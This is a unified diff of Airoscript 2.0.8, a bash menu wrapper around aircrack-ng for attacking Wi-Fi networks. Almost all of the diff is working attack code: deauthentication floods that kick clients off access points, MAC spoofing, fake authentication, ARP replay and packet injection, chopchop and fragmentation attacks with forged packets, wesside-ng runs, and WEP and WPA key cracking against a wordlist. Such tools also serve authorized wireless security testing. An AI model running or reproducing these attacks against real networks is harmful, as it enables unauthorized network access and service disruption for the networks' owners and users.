@@ -3,10 +3,9 @@
 # Program:	Airoscript                                                          
 # Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
 # Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes, darkAudax, Atheros support thx to green-freq
-# Date:	        27.01.2008
-# Version:	2.0.8 SVN TESTING RELEASE FOR AIRCRACK-NG 1.0 
-# 
-# Dependencies: aircrack-ng,xterm,grep,awk,macchanger, drivers capable of injection
+# Date:	        28.01.2008
+# Version:	2.0.8 SVN TESTING RELEASE FOR AIRCRACK-NG 1.0 beta
+# Dependencies: aircrack-ng, xterm, grep, awk, macchanger, drivers capable of injection, mdk3 (optional)
 #
 #		To change color theme just do a search and replace
 #
@@ -18,20 +17,21 @@
 #                                                                                           
 # Notes:  Important  ===>>>  Set variable DEBUG to 1 to enable debugging of errors  <<<===
 #         IMPORTANT DO NOT PUT others FILES IN OUTPUT FOLDER, because it's content can be erased
-
 #CardCtl executable (on 2.4 kernels, it is cardctl)
 CARDCTL="pccardctl"
+#Your dhcp client utility
 DHCPSOFT="dhcpcd"
-#
+#If you want the welcome message
 WELCOME="0"
-DEBUG="1"
+#Allows all xterm window to stay on screen after the operation they contain is finished
+DEBUG="0"
 #This is the interface you want to use to perform the attack
 #If you dont set this, airoscript will ask you for interface to use
 WIFI=""
 #This is the rate per second at wich packets will be injected
 INJECTRATE="330"
 #How many times the deauth attack is run
-DEAUTHTIME="5"
+DEAUTHTIME="3"
 #Time between re-association with target AP
 AUTHDELAY="80"
 KEEPALIVE="30"
@@ -43,6 +43,7 @@ AIRODUMP="airodump-ng"
 AIREPLAY="aireplay-ng"	
 AIRCRACK="aircrack-ng"
 ARPFORGE="packetforge-ng"
+WESSIDE="wesside-ng"
 #The path where the data is stored (FOLDER MUST EXIST !)
 DUMP_PATH="/wifi"
 # Path to your wordlist file (for WPA and WEP dictionnary attack)
@@ -50,18 +51,14 @@ WORDLIST="/wifi/wordlist.txt"
 #The Mac address used to associate with AP during fakeauth			
 FAKE_MAC="00:06:25:02:FF:D8"
 # IP of the AP and clients to be used for CHOPCHOP and Fragmentation attack
-
 # Host_IP and Client_IP used for arp generation from xor file (frag and chopchop)
-
 #Host_IP="192.168.1.1"
 #Client_IP="192.168.1.37"
 #Host_IP="192.168.0.1"
 #Client_IP="192.168.0.37"
 Host_IP="255.255.255.255"
 Client_IP="255.255.255.255"
-
 # Fragmentation IP
-
 #FRAG_HOST_IP="192.168.1.1"
 #FRAG_CLIENT_IP="192.168.1.37"
 #FRAG_HOST_IP="192.168.0.1"
@@ -106,60 +103,53 @@ function menu {
 function monitor_interface {
 IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
 if [ $TYPE = RalinkUSB ]
-	then
-
+then
 iwpriv $WIFI rfmontx 1
 iwpriv $WIFI forceprism 1
 echo $IS_MONITOR
 
 elif [ $TYPE = Ralinkb/g ]
-	then
- 		iwpriv $WIFI rfmontx 1
- 		iwpriv $WIFI forceprism 1
-		echo $IS_MONITOR
-elif [ $TYPE = Atherosmadwifi-ng ]
-	then
+then
+iwpriv $WIFI rfmontx 1
+iwpriv $WIFI forceprism 1
+echo $IS_MONITOR
 
+elif [ $TYPE = Atherosmadwifi-ng ]
+then
 $AIRMON stop ath0
 $AIRMON stop ath1
 $AIRMON stop ath2
 $AIRMON start wifi0
-
-	else
+else
 echo "running standard monitor mode command"
 echo $IS_MONITOR
-	fi 
+fi 
 }
 # this sets wifi interface if not hard coded in the script
 function setinterface {
 #INTERFACES=`iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
 #INTERFACES=`iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
 INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
-	if [ $WIFI =  ]
-		then
-echo "=> Select your interface: (ath for madwifi devices)"
+TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
+if [ $WIFI =  ]
+then
+echo "=> Select your interface: (athX for madwifi devices)"
 echo ""
-	select WIFI in $INTERFACES; do
-	break;
-	done
+select WIFI in $INTERFACES; do
+break;
+done
 echo ""
 echo " 	Interface to use is : $WIFI"
-echo ""
-TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-echo ""
 echo " 	Interface type is   : $TYPE"
 echo ""
 testmac
-		else
+else
 echo ""
 echo " 	Interface to use is : $WIFI"
-echo ""
-TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-echo "" 
 echo " 	Interface type is   : $TYPE"
 echo ""
 testmac 
-	fi
+fi
 }
 function testmac {
 if [ $TYPE = Atherosmadwifi-ng ]
@@ -173,26 +163,26 @@ fi
 }
 function setinterface2 {
 INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
-  echo "   Select your interface"
-  echo " "
-		select WIFI in $INTERFACES; do
-		break;
-		done
-  echo "#######################################"
-  echo "### Interface to use is : $WIFI"
 TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $4}'`
-  echo "### Interface type   is : $TYPE"
+echo "   Select your interface"
+echo " "
+select WIFI in $INTERFACES; do
+break;
+done
+echo "#######################################"
+echo "### Interface to use is : $WIFI"
+echo "### Interface type   is : $TYPE"
 testmac
 }
 # this function allows debugging of xterm commands
 function debug {
-	if [ $DEBUG = 1 ]
-		then
-  echo "        Debug Mode On              "
-			HOLD="-hold"
-	else
-		HOLD=""
-	fi
+if [ $DEBUG = 1 ]
+then
+echo " 	Debug Mode On              "
+HOLD="-hold"
+else
+HOLD=""
+fi
 }
 # This is another great contribution from CurioCT that allows you to manually enter SSID if none is set
 function blankssid {
@@ -262,7 +252,6 @@ acouper=${#ssid}
 fin=$(($acouper-idlength))
 Host_SSID=${ssid:1:fin}
 }
-# This is a simple function to ask what type of AP you are looking for
 function choosetype {
 while true; do
   clear
@@ -290,8 +279,6 @@ while true; do
   esac
 done 
 }
-
-# This is a simple function to ask what type of AP you are looking for
 function choosefake {
 while true; do
   clear
@@ -312,11 +299,8 @@ while true; do
   esac
 done 
 }
-
-# This is a simple function to ask what type of scan you want to run
 function choosescan {
 while true; do
-
   echo "#######################################"
   echo "###  Select channel to use          ###"
   echo "###                                 ###"
@@ -333,7 +317,6 @@ while true; do
   esac
 done 
 }
-# This function ask after an AP selection for a client sel
 function choosetarget {
 while true; do
   clear
@@ -358,7 +341,6 @@ while true; do
   esac
 done 
 }
-# this ask if the client scan was successfull
 function clientfound {
 while true; do
   clear
@@ -377,7 +359,6 @@ while true; do
   esac
 done 
 }
-# deauth type sel
 function choosedeauth {
 while true; do
   clear
@@ -398,7 +379,6 @@ while true; do
   esac
 done 
 }
-# this function ask for attack type
 function attackwep {
 while true; do
   clear
@@ -443,13 +423,11 @@ while true; do
   esac
 done 
 }
-# this function ask for attack type
 function attackopn {
   echo "#######################################"
   echo "###   You need to select a target   ###"
   echo "#######################################"
 }
-# client origin 
 function askclientsel {
 while true; do
   clear
@@ -471,14 +449,12 @@ while true; do
   esac
 done 
 }
-# manual client input
 function clientinput {
   echo "#######################################"
   echo "###                                 ###"
   echo "###   Type in client mac now        ###"
   echo "###                                 ###"
   echo "#######################################"
-#echo -n "OK, now type in your client MAC: "
 read Client_MAC
   echo "#######################################"
   echo "###                                 ###"
@@ -487,7 +463,6 @@ read Client_MAC
   echo "#######################################"
 set -- ${Client_MAC}
 }
-# associated client or all clients ?
 function asklistsel {
 while true; do
   clear
@@ -511,7 +486,6 @@ read yn
   esac
 done 
 }
-# sel client from list    	
 function listsel1 {
 HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
 	clear
@@ -528,7 +502,6 @@ HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'
 		break;
 	done
 }
-# sel client from list, shows only associated clients	  	
 function listsel2 {
 HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
 	clear
@@ -547,7 +520,6 @@ HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep 
 		break;
 	done
 }
-# sel client from list, shows only associated clients	  	
 function listsel3 {
 HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
 	clear
@@ -566,14 +538,11 @@ HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| 
 		break;
 	done
 }
-# reset and killall commands , + ejection/interruption of interface	
 function cleanup {
 	killall -9 aireplay-ng airodump-ng > /dev/null &
 	ifconfig $WIFI down
-	#pccardctl eject
 	clear
         sleep 2
-	#pccardctl insert
 	$CARDCTL eject
 	sleep 2
 	$CARDCTL insert
@@ -581,10 +550,7 @@ function cleanup {
 	$AIRMON start $WIFI $Host_CHAN
 	iwconfig $WIFI
 }
-
-# target listing	
 function target {
-		clear
   echo "#######################################"
   echo "###                                 ###"
   echo "###   AP SSID   = $Host_SSID"
@@ -652,9 +618,6 @@ function wpaconfigure {
 		echo "Will now ping google.com"
 		ping www.google.com
 }
-##################################################################################
-#
-#	Attack functions
 function witchcrack {
 if [ $Host_ENC = "WEP" ]
   		then
@@ -676,7 +639,6 @@ if [ $Host_ENC = "WEP" ]
 }
 function wichchangemac {
 while true; do
-
   echo "#######################################"
   echo "###      Select next step           ###"
   echo "###                                 ###"
@@ -716,13 +678,10 @@ if [ $TYPE = "RalinkUSB" ]
 		fi			
 }
 function fakechangemacrausb {
-
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $FAKE_MAC $WIFI 
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
@@ -730,9 +689,7 @@ function fakechangemacwlan {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $FAKE_MAC $WIFI 
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor		
 }
@@ -740,34 +697,29 @@ function fakechangemacath {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $FAKE_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
 function macchanger {
 if [ $TYPE = "RalinkUSB" ]
-  		then
-		changemacrausb
-		elif [ $TYPE = "Ralinkb/g" ]
-		then 
-		changemacwlan
-		elif [ $TYPE = "Atherosmadwifi-ng" ]
-		then
-		changemacath
-		else
-		echo "Unknow way to change mac"
-		fi			
+then
+changemacrausb
+elif [ $TYPE = "Ralinkb/g" ]
+then 
+changemacwlan
+elif [ $TYPE = "Atherosmadwifi-ng" ]
+then
+changemacath
+else
+echo "Unknow way to change mac"
+fi			
 }
 function changemacrausb {
-
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
@@ -775,45 +727,37 @@ function changemacwlan {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
 function changemacath {
-
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
 function manualmacchanger {
 if [ $TYPE = "RalinkUSB" ]
-  		then
-		manualchangemacrausb
-		elif [ $TYPE = "Ralinkb/g" ]
-		then
-		manualchangemacwlan
-		elif [ $TYPE = "Atherosmadwifi-ng" ]
-		then
-		manualchangemacath
-		else
-		echo "Unknow way to change mac"
-		fi			
+then
+manualchangemacrausb
+elif [ $TYPE = "Ralinkb/g" ]
+then
+manualchangemacwlan
+elif [ $TYPE = "Atherosmadwifi-ng" ]
+then
+manualchangemacath
+else
+echo "Unknow way to change mac"
+fi			
 }
 function manualchangemacrausb {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
@@ -821,9 +765,7 @@ function manualchangemacwlan {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor				
 }
@@ -831,9 +773,7 @@ function manualchangemacath {
 ifconfig $WIFI down
 iwconfig $WIFI mode managed
 sleep 2
-
 macchanger -m $Client_MAC $WIFI
-
 ifconfig $WIFI up
 iwconfig $WIFI mode monitor				
 }
@@ -845,7 +785,6 @@ if [ $Host_ENC = "WEP" ]
 		wpaconfigure
 		fi			
 }
-# aircrack command 
 function crackptw   {
 xterm $HOLD -title "Aircracking-PTW: $Host_SSID" $TOPRIGHT -e $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
 }
@@ -861,13 +800,10 @@ echo -n "type encryption size 64,128 etc..."
 read ENC_SIZE
 echo You typed: $ENC_SIZE
 set -- ${ENC_SIZE}
-
 xterm $HOLD -title "Manual cracking: $Host_SSID" $TOPRIGHT -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
-
 }
 function crack {
 while true; do
-
   echo "#######################################"
   echo "###      WEP CRACKING OPTIONS       ###"
   echo "###                                 ###"
@@ -885,22 +821,19 @@ while true; do
   esac
 done 
 }
-# WPA attack function
 function wpahandshake {
-	clear
-	rm -rf $DUMP_PATH/$Host_MAC*
-	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
+clear
+rm -rf $DUMP_PATH/$Host_MAC*
+xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 }
 function wpacrack {
 xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -e $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
 }
 function Scan {
-	clear
-	rm -rf $DUMP_PATH/dump*
-#	$AIRMON start $WIFI
-	xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
+clear
+rm -rf $DUMP_PATH/dump*
+xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
 }
-# This scan for targets on a specific channel
 function Scanchan {
   echo "#######################################"
   echo "###    Input channel number         ###"
@@ -910,28 +843,27 @@ function Scanchan {
   echo "###  Multiple channels 1,1,2,5-7,11 ###"
   echo "###                                 ###"
   echo "#######################################"
-#echo -n "On which channel would you like to scan ? ==> "
 read channel_number
 echo You typed: $channel_number
 set -- ${channel_number}
-	clear
-	rm -rf $DUMP_PATH/dump*
-	$AIRMON start $WIFI $channel_number
-	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
+clear
+rm -rf $DUMP_PATH/dump*
+$AIRMON start $WIFI $channel_number
+xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
 }
 function capture {
-	clear
-	rm -rf $DUMP_PATH/$Host_MAC*
-	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
+clear
+rm -rf $DUMP_PATH/$Host_MAC*
+xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
 }
 function deauthall {
-	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
+xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
 }
 function deauthclient {
-	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $Client_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
+xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $Client_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
 }
 function deauthfake {
-	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $FAKE_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
+xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $FAKE_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
 }
 function fakeauth {
 xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI
@@ -945,88 +877,78 @@ xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -f
 function fakeauth3 {
 xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
 }
-# This is a set of command to manually kick all clients from selected AP to discover them
 function clientdetect {
-	capture & deauthall
+capture & deauthall & menufonction
 }
-# attack against client when a previous attack has stalled
 function solointeractiveattack {
-	xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -p 0841 -c FF:FF:FF:FF:FF:FF -x $INJECTRATE & menufonction
+xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -p 0841 -c FF:FF:FF:FF:FF:FF -x $INJECTRATE & menufonction
 }
-# fake attack function	
 function attack {
-	capture & xterm $HOLD -title "Injection: Host: $Host_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $FAKE_MAC  -x $INJECTRATE & fakeauth & menufonction
+capture & xterm $HOLD -title "Injection: Host: $Host_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86  -x $INJECTRATE & fakeauth3 & menufonction
 }
-# client type attack function
 function attackclient {
-	capture & xterm $HOLD -title "Injection: Host : $Host_MAC CLient : $Client_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $Client_MAC -x $INJECTRATE & menufonction
+capture & xterm $HOLD -title "Injection: Host : $Host_MAC CLient : $Client_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 -x $INJECTRATE & menufonction
 }
-# interactive attack with client
 function interactiveattack {
-	capture & xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & menufonction
+capture & xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & menufonction
 }
-# interactive attack with fake mac
 function fakeinteractiveattack {
-	capture & xterm $HOLD -title "Interactive Packet Sel on Host: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & fakeauth & menufonction
+capture & xterm $HOLD -title "Interactive Packet Sel on Host: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & fakeauth3 & menufonction
 }
-
-# Experimental features
 function chopchopattack {
-	clear
+clear
 rm -rf $DUMP_PATH/$Host_MAC*
-	capture &  fakeauth &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & menufonction
+rm -rf replay_dec-*.xor
+capture &  fakeauth3 &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & menufonction
 }
 function chopchopattackclient {
-	clear
+clear
 rm -rf $DUMP_PATH/$Host_MAC*
-	capture &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & menufonction
+rm -rf replay_dec-*.xor
+echo "running chopchop with: $AIREPLAY --chopchop -h $Client_MAC $WIFI"
+capture &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & menufonction
 }
 function chopchopend {
 rm -rf $DUMP_PATH/chopchop_$Host_MAC*
-	$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
-	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI & menufonction
+$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
 }
 function chopchopclientend {
 rm -rf $DUMP_PATH/chopchop_$Host_MAC*
-	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
-	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI & menufonction
+$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
 }
-
 function fragnoclient {
-rm -rf fragment-*
-rm -rf $DUMP_PATH/frag_*
+rm -rf fragment-*.xor
+rm -rf $DUMP_PATH/frag_*.cap
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
 iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
-xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth &  menufonction
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth3 &  menufonction
 }
 function fragnoclientend {
 iwconfig $WIFI rate 1M
 $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
 }
 function fragmentationattack {
-rm -rf fragment-*
-rm -rf $DUMP_PATH/frag_*
+rm -rf fragment-*.xor
+rm -rf $DUMP_PATH/frag_*.cap
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
 iwconfig $WIFI rate 2M channel $Host_CHAN mode monitor
 xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  menufonction
 }
-
 function fragmentationattackend {
 iwconfig $WIFI rate 2M
 $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
 }
-
 function pskarp {
 rm -rf $DUMP_PATH/arp_*.cap
-	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
-	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap $WIFI & menufonction
+$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
+capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
 }
-
-# Another menu for special tasks
 function optionmenu {
 while true; do
   echo "#######################################"
@@ -1036,8 +958,8 @@ while true; do
   echo "###   2) Select another interface   ###"
   echo "###   3) Reset selected interface   ###"
   echo "###   4) Change MAC of interface    ###"
-  echo "###   5) Bring Mdk3 pain            ###"
-  echo "###   6) Unleash Wesside-ng fury    ###"
+  echo "###   5) Mdk3                       ###"
+  echo "###   6) Wesside-ng                 ###"
   echo "###   7) Return to main menu        ###"
   echo "###                                 ###"
   echo "#######################################"
@@ -1078,12 +1000,21 @@ while true; do
 done 
 }
 function wesside {
-	xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack" -bg "#000000" -fg "#1DFF00" -e wesside-ng -i $WIFI & choosewesside
+rm -rf prga.log
+rm -rf wep.cap
+rm -rf key.log
+xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack" -bg "#000000" -fg "#1DFF00" -e wesside-ng -i $WIFI & choosewesside
